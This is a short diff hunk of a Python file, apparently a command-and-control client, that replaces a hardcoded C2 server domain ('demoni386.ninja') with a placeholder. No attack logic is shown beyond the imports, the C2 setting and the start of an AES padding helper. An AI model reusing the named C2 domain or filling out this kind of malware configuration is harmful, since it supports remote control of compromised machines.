@@ -8,7 +8,7 @@ import subprocess, os, re, colorama
 from colorama import Fore, Back, Style
 from Crypto.Hash import keccak
 
-C2ServerIP = "demoni386.ninja"
+C2ServerIP = "C2_DOMAIN_HERE!"
 
 def _pad(s):
     bs = AES.block_size
